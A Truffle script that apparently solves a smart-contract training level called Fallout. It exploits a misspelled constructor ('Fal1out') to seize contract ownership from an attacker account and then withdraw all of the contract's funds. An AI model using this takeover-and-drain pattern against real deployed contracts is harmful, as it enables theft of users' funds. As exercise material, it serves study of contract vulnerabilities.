const FalloutContract = artifacts.require('Fallout')
const assert = require('assert')

async function execute(callback) {
    /**
     * Fallout contract does not have a constructor, since the function that
     * is supposed to be the constructor is actually mispelled ('Fal1out').
     * Thus, it can be called by anyone.
     */

    // Get attacker account
    let attacker = web3.eth.accounts[1]
    console.log(`Attacker address: ${attacker}`)

    // Instance vulnerable contract
    let contract = await FalloutContract.deployed()

    // Check who's the owner
    let contractOwner = await contract.owner.call()
    assert.equal(contractOwner, web3.eth.accounts[0])
    console.log(`Contract owner: ${contractOwner}`)

    await contract.Fal1out({
        from: attacker,
        value: web3.toWei(0.0009, 'ether')
    })

    // Check who's the owner now (:
    contractOwner = await contract.owner.call()
    assert.equal(contractOwner, attacker)
    console.log(`Contract owner: ${contractOwner}`)

    // Withdraw all money
    let response = await contract.collectAllocations({
        from: attacker
    })
    console.log(`Withdrew all allocations in transaction ${response.tx}`)

    callback()
}

module.exports = execute
